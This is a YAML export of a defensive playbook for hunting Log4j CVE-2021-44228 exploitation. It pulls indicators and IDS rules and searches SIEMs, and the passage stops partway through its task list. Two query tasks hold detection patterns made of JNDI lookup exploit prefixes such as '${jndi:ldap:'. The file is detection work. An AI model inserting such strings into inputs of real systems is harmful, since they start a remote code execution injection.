contentitemexportablefields:
  contentitemfields:
    definitionid: ""
    fromServerVersion: 6.0.0
    itemVersion: 1.0.6
    packID: ""
    packName: ""
    prevname: ""
    propagationLabels:
    - all
    toServerVersion: ""
description: "Critical RCE Vulnerability: log4j - CVE-2021-44228\n\nOn Dec. 9, 2021,
  a remote code execution (RCE) vulnerability in Apache log4j 2 was identified being
  exploited in the wild. Public proof of concept (PoC) code was released and subsequent
  investigation revealed that exploitation was incredibly easy to perform. \n\nOn
  Dec. 14 2021, another vulnerability was discovered related the log4j 0-day exploit
  known as CVE-2021-45046.\n\nOn Dec 18 2021, yet another vulnerability was discovered
  related the log4j 0-day exploit known as CVE-2021-45105 that allows an attacker
  with control over Thread Context Map data to cause a denial of service when a crafted
  string is interpreted. This issue was fixed in Log4j 2.17.0 and 2.12.3.\n\n**Affected
  Version**\n\nApache Log4j 2.x <= 2.15.0-rc1\n\nThis playbook should be triggered
  manually or can be configured as a job.\nPlease create a new incident and choose
  the **CVE-2021-44228 - Log4j RCE** playbook and **Rapid Breach Response** incident
  type.\n\n**The playbook includes the following tasks:**\n\n* Collect related known
  indicators from several sources.\n* Indicators and exploitation patterns hunting
  using PAN-OS, Cortex XDR and SIEM products.\n*Search for possible vulnerable servers
  using Xpanse.\n* Block indicators automatically or manually.\n\n**Mitigations:**\n*
  Apache official CVE-2021-44228 patch.\n* Unit42 recommended mitigations.\n* Detection
  Rules.\n    * Snort\n    * Suricata\n    * Sigma\n    * Yara\n\nMore information:\n[Apache
  Log4j Vulnerability Is Actively Exploited in the Wild (CVE-2021-44228)](https://unit42.paloaltonetworks.com/apache-log4j-vulnerability-cve-2021-44228/)\n\nNote:
  This is a beta playbook, which lets you implement and test pre-release software.
  Since the playbook is beta, it might contain bugs. Updates to the pack during the
  beta phase might include non-backward compatible features. We appreciate your feedback
  on the quality and usability of the pack to help us identify issues, fix them, and
  continually improve."
id: 69a5ad6d-ceda-4eb7-8a7f-7654e6c80142
inputs:
- description: |-
    The Splunk index field to search in.
    Default is "*"
  key: SplunkIndex
  playbookInputQuery: null
  required: false
  value:
    simple: '*'
- description: |-
    The Splunk sourcetype field to search in.
    Default is "*"
  key: SplunkSourcetype
  playbookInputQuery: null
  required: false
  value:
    simple: '*'
- description: The earliest time for Splunk query.
  key: SplunkEarliestTime
  playbookInputQuery: null
  required: false
  value:
    simple: -1d@d
- description: The time range for QRadar query.
  key: QRadarTimeRange
  playbookInputQuery: null
  required: false
  value:
    simple: Last 1 DAYS
- description: Whether to investigate automatically the endpoint logs "/var/log" using
    XDR Endpoint Script Execution or manually.
  key: XDRScriptExecution
  playbookInputQuery: null
  required: false
  value:
    simple: "False"
- description: The Endpoint IDs to search using XDR Endpoint Script Execution in a
    comma delimited format. If you would like the playbook to execute the command
    on all known Linux OS endpoints Set to "ALL".
  key: XDREndpointIDs
  playbookInputQuery: null
  required: false
  value: {}
- description: The playbook description for Rapid Breach Response layout.
  key: PlaybookDescription
  playbookInputQuery: null
  required: false
  value:
    simple: "Critical RCE Vulnerability: log4j - CVE-2021-44228\n\nOn Dec. 9, 2021,
      a remote code execution (RCE) vulnerability in Apache log4j 2 was identified
      being exploited in the wild. Public proof of concept (PoC) code was released
      and subsequent investigation revealed that exploitation was incredibly easy
      to perform. \n\nAffected Version\nApache Log4j 2.x <= 2.15.0-rc1\n\nThis playbook
      should be trigger manually and includes the following tasks: \n\n* Collect related
      known indicators from several sources.\n* Indicators and exploitation patterns
      hunting using PAN-OS, Cortex XDR and SIEM products.\n* Block indicators automatically
      or manually.\n\nMitigations:\n* Apache official CVE-2021-44228 patch.\n* Unit42
      recommended mitigations.\n\nMore information:\n[Apache Log4j Vulnerability Is
      Actively Exploited in the Wild (CVE-2021-44228)](https://unit42.paloaltonetworks.com/apache-log4j-vulnerability-cve-2021-44228/)\n\nNote:
      This is a beta playbook, which lets you implement and test pre-release software.
      Since the playbook is beta, it might contain bugs. Updates to the pack during
      the beta phase might include non-backward compatible features. We appreciate
      your feedback on the quality and usability of the pack to help us identify issues,
      fix them, and continually improve."
- description: The EDL domain blocklist name.
  key: EDLDomainBlocklist
  playbookInputQuery: null
  required: false
  value: {}
- description: Whether to block the indicators automatically or not.
  key: BlockIndicatorsAutomatically
  playbookInputQuery: null
  required: false
  value:
    simple: "False"
- description: "The verdict of the collected indicators. Default is \"Malicious\".
    \nOther options can be \"Suspicious\" and \"Unknown\"."
  key: CollectedIndicatorsSeverity
  playbookInputQuery: null
  required: false
  value:
    simple: Malicious
- description: Whether to perform XQL hunting queries. Default is "False".
  key: RunXQLHuntingQueries
  playbookInputQuery: null
  required: false
  value:
    simple: "False"
- description: The log4j related CVEs.
  key: RelatedCVEs
  playbookInputQuery: null
  required: false
  value:
    simple: CVE-2021-44228, CVE-2021-45046, CVE-2021-45105
name: CVE-2021-44228 - Log4j RCE_copy_1
outputs: []
sourceplaybookid: CVE-2021-44228 - Log4j RCE
starttaskid: "0"
tasks:
  "0":
    continueonerrortype: ""
    id: "0"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "1"
      - "66"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      id: 5111bc59-ef4b-4bf0-8adc-668f55f89c3b
      iscommand: false
      name: ""
      version: -1
    taskid: 5111bc59-ef4b-4bf0-8adc-668f55f89c3b
    timertriggers: []
    type: start
    view: |-
      {
        "position": {
          "x": 1230,
          "y": -1290
        }
      }
  "1":
    continueonerrortype: ""
    id: "1"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "2"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      id: d6d383d1-e23a-4015-82bb-827694022319
      iscommand: false
      name: Collect Indicators
      type: title
      version: -1
    taskid: d6d383d1-e23a-4015-82bb-827694022319
    timertriggers: []
    type: title
    view: |-
      {
        "position": {
          "x": 2150,
          "y": -1130
        }
      }
  "2":
    continueonerror: true
    continueonerrortype: ""
    id: "2"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "8"
    note: false
    quietmode: 0
    scriptarguments:
      unescape_domain:
        simple: "False"
      url:
        simple: https://gist.githubusercontent.com/gnremy/c546c7911d5f876f263309d7161a7217/raw/170f7d6cf92172443ecc68db0b6cbd4d8226a398/CVE-2021-44228_IPs.csv
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: This script will extract indicators from HTML and will handle bad
        TLD to avoid file extensions false positives.
      id: 5dfaef45-c84d-454f-84be-f7b951b1afaf
      iscommand: false
      name: Collect indicators from GreyNoise
      script: ParseHTMLIndicators
      type: regular
      version: -1
    taskid: 5dfaef45-c84d-454f-84be-f7b951b1afaf
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": 2150,
          "y": -980
        }
      }
  "6":
    continueonerrortype: ""
    id: "6"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "8"
    note: false
    quietmode: 0
    scriptarguments:
      filename:
        simple: emerging-exploit-suricata.rules
      method:
        simple: GET
      saveAsFile:
        simple: "yes"
      url:
        simple: https://rules.emergingthreatspro.com/open/suricata-5.0/rules/emerging-exploit.rules
    separatecontext: false
    skipunavailable: true
    task:
      brand: ""
      description: |-
        Download Suricata Rules.
        Please note the log4j rules are part of the released package.
      id: 3006141f-b19f-44ad-85ef-f3c8d5507cc0
      iscommand: false
      name: Download Suricata Rules
      script: http
      type: regular
      version: -1
    taskid: 3006141f-b19f-44ad-85ef-f3c8d5507cc0
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": 1230,
          "y": -980
        }
      }
  "7":
    continueonerrortype: ""
    id: "7"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "8"
    note: false
    quietmode: 0
    scriptarguments:
      filename:
        simple: emerging-exploit-snort.rules
      method:
        simple: GET
      saveAsFile:
        simple: "yes"
      url:
        simple: https://rules.emergingthreatspro.com/open/snort-2.9.0/rules/emerging-exploit.rules
    separatecontext: false
    skipunavailable: true
    task:
      brand: ""
      description: |-
        Download Snort Rules.
        Please note the log4j rules are part of the released package.
      id: a7b11f1b-71be-42b1-8128-898fff21acf3
      iscommand: false
      name: Download Snort Rules
      script: http
      type: regular
      version: -1
    taskid: a7b11f1b-71be-42b1-8128-898fff21acf3
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": 1690,
          "y": -980
        }
      }
  "8":
    continueonerrortype: ""
    id: "8"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "9"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      id: a8c875a3-3a5f-4873-8cf4-4d8d4199681d
      iscommand: false
      name: Extract Indicators
      type: title
      version: -1
    taskid: a8c875a3-3a5f-4873-8cf4-4d8d4199681d
    timertriggers: []
    type: title
    view: |-
      {
        "position": {
          "x": 1230,
          "y": -800
        }
      }
  "9":
    continueonerror: true
    continueonerrortype: ""
    id: "9"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "10"
    note: false
    quietmode: 0
    scriptarguments:
      text:
        complex:
          accessor: indicators
          root: http.parsedBlog
    separatecontext: false
    skipunavailable: false
    task:
      brand: Builtin
      description: commands.local.cmd.extract.indicators
      id: 39fb99f8-132b-4243-8952-4adaf6b1776c
      iscommand: true
      name: Extract Indicators From Data Collected
      script: Builtin|||extractIndicators
      type: regular
      version: -1
    taskid: 39fb99f8-132b-4243-8952-4adaf6b1776c
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": 1230,
          "y": -640
        }
      }
  "10":
    continueonerrortype: ""
    id: "10"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "57"
      - "58"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      id: 8f873aab-8cdf-4fd7-8472-6a52305037ed
      iscommand: false
      name: Tag and Link Indicators
      type: title
      version: -1
    taskid: 8f873aab-8cdf-4fd7-8472-6a52305037ed
    timertriggers: []
    type: title
    view: |-
      {
        "position": {
          "x": 1230,
          "y": -440
        }
      }
  "15":
    continueonerrortype: ""
    id: "15"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "36"
    note: false
    quietmode: 0
    scriptarguments:
      incidentId:
        complex:
          accessor: id
          root: incident
      indicatorsValues:
        complex:
          filters:
          - - left:
                iscontext: true
                value:
                  simple: ExtractedIndicators.IP
              operator: isNotEmpty
          root: ExtractedIndicators.IP
          transformers:
          - args:
              item:
                iscontext: true
                value:
                  simple: ExtractedIndicators.Domain
            operator: append
          - args:
              item:
                iscontext: true
                value:
                  simple: ExtractedIndicators.URL
            operator: append
          - args:
              item:
                iscontext: true
                value:
                  simple: ExtractedIndicators.CVE
            operator: append
          - args:
              item:
                iscontext: true
                value:
                  simple: ExtractedIndicators.File
            operator: append
    separatecontext: false
    skipunavailable: false
    task:
      brand: Builtin
      description: commands.local.cmd.associate.indicators
      id: 401aa65f-9b41-4f06-82fd-fd92ee6642a9
      iscommand: true
      name: Link Indicators To Incident
      script: Builtin|||associateIndicatorsToIncident
      type: regular
      version: -1
    taskid: 401aa65f-9b41-4f06-82fd-fd92ee6642a9
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": 1230,
          "y": -80
        }
      }
  "16":
    continueonerrortype: ""
    id: "16"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "19"
      - "20"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      id: 8a686c9c-fb7b-4510-85cc-2dc7e67f9506
      iscommand: false
      name: SIEM Hunting
      type: title
      version: -1
    taskid: 8a686c9c-fb7b-4510-85cc-2dc7e67f9506
    timertriggers: []
    type: title
    view: |-
      {
        "position": {
          "x": 760,
          "y": 560
        }
      }
  "17":
    continueonerrortype: ""
    id: "17"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "27"
      - "28"
      - "88"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      id: 95e48dc3-114a-4b64-8f63-0752a92502a2
      iscommand: false
      name: Palo Alto Networks Hunting
      type: title
      version: -1
    taskid: 95e48dc3-114a-4b64-8f63-0752a92502a2
    timertriggers: []
    type: title
    view: |-
      {
        "position": {
          "x": 1700,
          "y": 560
        }
      }
  "19":
    continueonerrortype: ""
    id: "19"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    loop:
      exitCondition: ""
      iscommand: false
      max: 100
      scriptArguments:
        IPAddress:
          complex:
            accessor: IP
            root: ExtractedIndicators
            transformers:
            - operator: uniq
        IndexName:
          simple: index=*
        MD5:
          complex:
            accessor: File
            filters:
            - - left:
                  iscontext: true
                  value:
                    simple: ExtractedIndicators
                operator: stringHasLength
                right:
                  value:
                    simple: "32"
            root: ExtractedIndicators
            transformers:
            - operator: uniq
        SHA1:
          complex:
            accessor: File
            filters:
            - - left:
                  iscontext: true
                  value:
                    simple: ExtractedIndicators
                operator: stringHasLength
                right:
                  value:
                    simple: "40"
            root: ExtractedIndicators
            transformers:
            - operator: uniq
        SHA256:
          complex:
            accessor: File
            filters:
            - - left:
                  iscontext: true
                  value:
                    simple: ExtractedIndicators
                operator: stringHasLength
                right:
                  value:
                    simple: "64"
            root: ExtractedIndicators
            transformers:
            - operator: uniq
        SelectFields:
          simple: source,timestamp
        URLDomain:
          complex:
            accessor: Domain
            root: ExtractedIndicators
            transformers:
            - operator: uniq
        earliest_time:
          complex:
            root: inputs.SplunkEarliestTime
        event_limit:
          simple: "100"
        latest_time:
          complex:
            root: inputs.SplunkLatestTime
      wait: 1
    nexttasks:
      '#none#':
      - "37"
    note: false
    quietmode: 0
    scriptarguments:
      IPAddress:
        complex:
          accessor: IP
          root: ExtractedIndicators
          transformers:
          - operator: uniq
      IndexName:
        simple: index=*
      SelectFields:
        simple: source,timestamp
      URLDomain:
        complex:
          accessor: Domain
          root: ExtractedIndicators
          transformers:
          - operator: uniq
      earliest_time:
        complex:
          root: inputs.SplunkEarliestTime
      event_limit:
        simple: "100"
      latest_time:
        complex:
          root: inputs.SplunkLatestTime
    separatecontext: true
    skipunavailable: true
    task:
      brand: ""
      description: This playbook queries Splunk for indicators such as file hashes,
        IP addresses, domains, or urls. It outputs detected users, ip addresses, and
        hostnames related to the indicators.
      id: 76162404-a8e0-4916-8fc5-9d689d28d1c1
      iscommand: false
      name: Splunk Indicator Hunting
      playbookId: Splunk Indicator Hunting
      type: playbook
      version: -1
    taskid: 76162404-a8e0-4916-8fc5-9d689d28d1c1
    timertriggers: []
    type: playbook
    view: |-
      {
        "position": {
          "x": 970,
          "y": 720
        }
      }
  "20":
    continueonerrortype: ""
    id: "20"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    loop:
      exitCondition: ""
      iscommand: false
      max: 100
      scriptArguments:
        IPAddress:
          complex:
            accessor: IP
            root: ExtractedIndicators
            transformers:
            - operator: uniq
        InvestigationIPFields:
          simple: sourceip,destinationip
        InvestigationUserFields:
          simple: username
        MD5:
          complex:
            filters:
            - - left:
                  iscontext: true
                  value:
                    simple: ExtractedIndicators.File
                operator: stringHasLength
                right:
                  value:
                    simple: "32"
            root: ExtractedIndicators.File
            transformers:
            - operator: uniq
        QradarIPfield:
          simple: sourceip,destinationip
        SHA1:
          complex:
            filters:
            - - left:
                  iscontext: true
                  value:
                    simple: ExtractedIndicators.File
                operator: stringHasLength
                right:
                  value:
                    simple: "40"
            root: ExtractedIndicators.File
            transformers:
            - operator: uniq
        SHA256:
          complex:
            filters:
            - - left:
                  iscontext: true
                  value:
                    simple: ExtractedIndicators.File
                operator: stringHasLength
                right:
                  value:
                    simple: "64"
            root: ExtractedIndicators.File
            transformers:
            - operator: uniq
        TimeFrame:
          complex:
            root: inputs.QRadarTimeRange
        URLDomain:
          complex:
            accessor: Domain
            root: ExtractedIndicators
            transformers:
            - operator: uniq
      wait: 1
    nexttasks:
      '#none#':
      - "37"
    note: false
    quietmode: 0
    scriptarguments:
      IPAddress:
        complex:
          accessor: IP
          root: ExtractedIndicators
          transformers:
          - operator: uniq
      InvestigationIPFields:
        simple: sourceip,destinationip
      InvestigationUserFields:
        simple: username
      QradarIPfield:
        simple: sourceip,destinationip
      TimeFrame:
        complex:
          root: inputs.QRadarTimeRange
      URLDomain:
        complex:
          accessor: Domain
          root: ExtractedIndicators
          transformers:
          - operator: uniq
    separatecontext: true
    skipunavailable: true
    task:
      brand: ""
      description: 'The Playbook queries QRadar SIEM for indicators such as file hashes,
        IP addresses, domains, or urls. '
      id: 36558a57-b964-40c4-8f42-6c7206cd11b7
      iscommand: false
      name: QRadar Indicator Hunting V2
      playbookId: QRadar Indicator Hunting V2
      type: playbook
      version: -1
    taskid: 36558a57-b964-40c4-8f42-6c7206cd11b7
    timertriggers: []
    type: playbook
    view: |-
      {
        "position": {
          "x": 550,
          "y": 720
        }
      }
  "21":
    continueonerrortype: ""
    id: "21"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "22"
      - "24"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      id: 94b4909c-ecbc-4a8d-8dec-32e8e397677f
      iscommand: false
      name: SIEM Advanced Hunting
      type: title
      version: -1
    taskid: 94b4909c-ecbc-4a8d-8dec-32e8e397677f
    timertriggers: []
    type: title
    view: |-
      {
        "position": {
          "x": -280,
          "y": 560
        }
      }
  "22":
    conditions:
    - condition:
      - - left:
            iscontext: true
            value:
              complex:
                filters:
                - - left:
                      iscontext: true
                      value:
                        simple: modules.brand
                    operator: isEqualString
                    right:
                      value:
                        simple: SplunkPy
                - - left:
                      iscontext: true
                      value:
                        simple: modules.state
                    operator: isEqualString
                    right:
                      value:
                        simple: active
                root: modules
          operator: isExists
      label: "Yes"
    continueonerrortype: ""
    id: "22"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#default#':
      - "37"
      "Yes":
      - "26"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: Check if Splunk instance is enabled.
      id: e6a3c8e0-b33f-401b-8226-78da92930ed5
      iscommand: false
      name: Is Splunk Enabled?
      type: condition
      version: -1
    taskid: e6a3c8e0-b33f-401b-8226-78da92930ed5
    timertriggers: []
    type: condition
    view: |-
      {
        "position": {
          "x": -10,
          "y": 720
        }
      }
  "23":
    continueonerrortype: ""
    id: "23"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "17"
      - "21"
      - "16"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      id: c41c8d5a-5950-4049-8e15-2fcd51fb3a64
      iscommand: false
      name: Threat Hunting
      type: title
      version: -1
    taskid: c41c8d5a-5950-4049-8e15-2fcd51fb3a64
    timertriggers: []
    type: title
    view: |-
      {
        "position": {
          "x": 1230,
          "y": 410
        }
      }
  "24":
    conditions:
    - condition:
      - - left:
            iscontext: true
            value:
              complex:
                filters:
                - - left:
                      iscontext: true
                      value:
                        simple: modules.brand
                    operator: isEqualString
                    right:
                      value:
                        simple: QRadar_v2
                - - left:
                      iscontext: true
                      value:
                        simple: modules.state
                    operator: isEqualString
                    right:
                      value:
                        simple: active
                root: modules
          operator: isExists
      label: "Yes"
    continueonerrortype: ""
    id: "24"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#default#':
      - "37"
      "Yes":
      - "25"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: Check if Splunk instance is enabled.
      id: 08112822-4303-403e-8fed-fbfb89bc0408
      iscommand: false
      name: Is QRadar Enabled?
      type: condition
      version: -1
    taskid: 08112822-4303-403e-8fed-fbfb89bc0408
    timertriggers: []
    type: condition
    view: |-
      {
        "position": {
          "x": -550,
          "y": 720
        }
      }
  "25":
    continueonerror: true
    continueonerrortype: ""
    id: "25"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "60"
    note: false
    quietmode: 0
    scriptarguments:
      base_field_match:
        simple: partial
      base_field_state:
        simple: include
      base_fields_to_search:
        simple: user_agent
      base_values_to_search:
        simple: '"${jndi:ldap:","${jndi:rmi:","${jndi:ldaps:","${jndi:dns:","{jndi:corba:","{jndi:iiop:","{jndi:nis:","{jndi:nds:"'
      select_fields:
        simple: DATEFORMAT(devicetime,'dd-MM-yyyy hh:mm'),LOGSOURCENAME(logsourceid),CATEGORYNAME(category),QIDNAME(qid),sourceip,destinationip,username')
      time_frame:
        complex:
          root: inputs.QRadarTimeRange
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: Build QRadar AQL Query.
      id: 331dd300-4497-45db-82a0-a3e3acff7883
      iscommand: false
      name: Build QRadar AQL Query
      script: QRadarCreateAQLQuery
      type: regular
      version: -1
    taskid: 331dd300-4497-45db-82a0-a3e3acff7883
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": -550,
          "y": 910
        }
      }
  "26":
    continueonerrortype: ""
    id: "26"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "37"
    note: false
    quietmode: 0
    scriptarguments:
      earliest_time:
        complex:
          root: inputs.SplunkEarliestTime
      query:
        simple: index=${SplunkIndex} sourcetype=${SplunkSourcetype} "${jndi:ldap:"
          OR "${jndi:rmi:" OR "${jndi:ldaps:" OR "${jndi:dns:" OR "{jndi:corba:" OR
          "{jndi:iiop:" OR "{jndi:nis:" OR "{jndi:nds:"
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: Searches Splunk for suspicious file creation where the file path
        is under INETCACHE.
      id: 1c04256a-27c8-4adf-83f5-08877fac1ac6
      iscommand: true
      name: Search for exploitation patterns
      script: '|||splunk-search'
      type: regular
      version: -1
    taskid: 1c04256a-27c8-4adf-83f5-08877fac1ac6
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": -10,
          "y": 910
        }
      }
  "27":
    continueonerrortype: ""
    id: "27"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    loop:
      exitCondition: ""
      iscommand: false
      max: 100
      wait: 1
    nexttasks:
      '#none#':
      - "37"
    note: false
    quietmode: 0
    scriptarguments:
      IPAddresses:
        complex:
          accessor: IP
          root: ExtractedIndicators
    separatecontext: true
    skipunavailable: true
    task:
      brand: ""
      description: "This is a multipurpose playbook used for hunting and threat detection.
        The playbook receives inputs based on hashes, IP addresses, or domain names
        provided manually or from outputs by other playbooks. \nWith the received
        indicators, the playbook leverages data received by PANW products including,
        Cortex Data Lake, Autofocus and Pan-OS to search for IP addresses, host names
        and users related to the provided indicators.\nThe output provided by the
        playbook facilitates pivoting searches for possibly affected IP addresses
        or users."
      id: b0e1bff8-ff41-427d-8de2-536dadb04422
      iscommand: false
      name: Palo Alto Networks - Hunting And Threat Detection
      playbookId: Palo Alto Networks - Hunting And Threat Detection
      type: playbook
      version: -1
    taskid: b0e1bff8-ff41-427d-8de2-536dadb04422
    timertriggers: []
    type: playbook
    view: |-
      {
        "position": {
          "x": 1490,
          "y": 720
        }
      }
  "28":
    continueonerrortype: ""
    id: "28"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    loop:
      exitCondition: ""
      iscommand: false
      max: 100
      wait: 1
    nexttasks:
      '#none#':
      - "37"
    note: false
    quietmode: 0
    scriptarguments:
      log_type:
        simple: threat
      query:
        simple: (threatid eq 91991) or (threatid eq 91994) or (threatid eq 91995)
          or (threatid eq 92001) or (threatid eq 92012)
    separatecontext: true
    skipunavailable: true
    task:
      brand: ""
      description: 'Query Panorama Logs of types: traffic, threat, url, data-filtering
        and wildfire.'
      id: b99b14d8-9b77-4f18-8075-e5fe5394b6bf
      iscommand: false
      name: Panorama Query Logs for Related Session
      playbookId: Panorama Query Logs
      type: playbook
      version: -1
    taskid: b99b14d8-9b77-4f18-8075-e5fe5394b6bf
    timertriggers: []
    type: playbook
    view: |-
      {
        "position": {
          "x": 1910,
          "y": 720
        }
      }
  "29":
    continueonerrortype: ""
    id: "29"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "39"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      id: d7bde2fd-907b-4514-84e8-48c2630b212a
      iscommand: false
      name: 'Remediation '
      type: title
      version: -1
    taskid: d7bde2fd-907b-4514-84e8-48c2630b212a
    timertriggers: []
    type: title
    view: |-
      {
        "position": {
          "x": 1160,
          "y": 2615
        }
      }
  "32":
    conditions:
    - condition:
      - - ignorecase: true
          left:
            iscontext: true
            value:
              complex:
                root: inputs.XDRScriptExecution
          operator: isEqualString
          right:
            value:
              simple: "True"
      label: "yes"
    continueonerrortype: ""
    id: "32"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#default#':
      - "29"
      "yes":
      - "33"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: Checks whether to execute XDR shell script for exploitation hunting.
      id: bcb65449-911c-4752-806f-42de2b353041
      iscommand: false
      name: Should search using XDR Endpoint Script Execution?
      type: condition
      version: -1
    taskid: bcb65449-911c-4752-806f-42de2b353041
    timertriggers: []
    type: condition
    view: |-
      {
        "position": {
          "x": 1690,
          "y": 1900
        }
      }
  "33":
    conditions:
    - condition:
      - - ignorecase: true
          left:
            iscontext: true
            value:
              complex:
                root: inputs.XDREndpointIDs
          operator: isEqualString
          right:
            value:
              simple: ALL
      label: ALL
    - condition:
      - - left:
            iscontext: true
            value:
              complex:
                root: inputs.XDREndpointIDs
          operator: isNotEmpty
      - - ignorecase: true
          left:
            iscontext: true
            value:
              complex:
                root: inputs.XDREndpointIDs
          operator: isNotEqualString
          right:
            value:
              simple: ALL
      label: Specific
    continueonerrortype: ""
    id: "33"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#default#':
      - "29"
      ALL:
      - "70"
      Specific:
      - "72"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: Checks whether the necessary input 'XDREndpointIDs' was provided.
      id: 9142e133-1007-4ff3-864c-aa811543bebd
      iscommand: false
      name: Should run on all known Linux OS endpoints?
      type: condition
      version: -1
    taskid: 9142e133-1007-4ff3-864c-aa811543bebd
    timertriggers: []
    type: condition
    view: |-
      {
        "position": {
          "x": 1870,
          "y": 2070
        }
      }
  "35":
    continueonerrortype: ""
    id: "35"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    loop:
      exitCondition: ""
      iscommand: false
      max: 100
      scriptArguments:
        SourceOfIndicators:
          complex:
            accessor: sourceLink
            root: http.parsedBlog
        countTotalIndicators:
          complex:
            accessor: Domain
            root: ExtractedIndicators
            transformers:
            - args:
                item:
                  iscontext: true
                  value:
                    simple: ExtractedIndicators.IP
              operator: append
            - args:
                item:
                  iscontext: true
                  value:
                    simple: ExtractedIndicators.URL
              operator: append
            - args:
                item:
                  iscontext: true
                  value:
                    simple: ExtractedIndicators.File
              operator: append
            - args:
                item:
                  iscontext: true
                  value:
                    simple: ExtractedIndicators.CVE
              operator: append
            - operator: uniq
            - operator: count
        playbookDescription:
          complex:
            root: inputs.Description
      wait: 1
    nexttasks:
      '#none#':
      - "23"
    note: false
    quietmode: 0
    scriptarguments:
      SourceOfIndicators:
        complex:
          accessor: sourceLink
          root: http.parsedBlog
      countTotalIndicators:
        complex:
          accessor: Domain
          root: ExtractedIndicators
          transformers:
          - args:
              item:
                iscontext: true
                value:
                  simple: ExtractedIndicators.IP
            operator: append
          - args:
              item:
                iscontext: true
                value:
                  simple: ExtractedIndicators.URL
            operator: append
          - args:
              item:
                iscontext: true
                value:
                  simple: ExtractedIndicators.File
            operator: append
          - args:
              item:
                iscontext: true
                value:
                  simple: ExtractedIndicators.CVE
            operator: append
          - operator: uniq
          - operator: count
      playbookDescription:
        complex:
          root: inputs.PlaybookDescription
    separatecontext: true
    skipunavailable: true
    task:
      brand: ""
      description: This playbook is responsible for setting up the Rapid Breach Response
        Incident Info tab.
      id: d212ea7e-124b-4f41-8108-91e86e49d35a
      iscommand: false
      name: Rapid Breach Response - Set Incident Info
      playbookId: Rapid Breach Response - Set Incident Info
      type: playbook
      version: -1
    taskid: d212ea7e-124b-4f41-8108-91e86e49d35a
    timertriggers: []
    type: playbook
    view: |-
      {
        "position": {
          "x": 1230,
          "y": 240
        }
      }
  "36":
    continueonerrortype: ""
    id: "36"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "35"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      id: 7b1098a1-317d-41e8-836a-fba962e6cb73
      iscommand: false
      name: Handle Rapid Breach Response Layout
      type: title
      version: -1
    taskid: 7b1098a1-317d-41e8-836a-fba962e6cb73
    timertriggers: []
    type: title
    view: |-
      {
        "position": {
          "x": 1230,
          "y": 110
        }
      }
  "37":
    continueonerrortype: ""
    id: "37"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
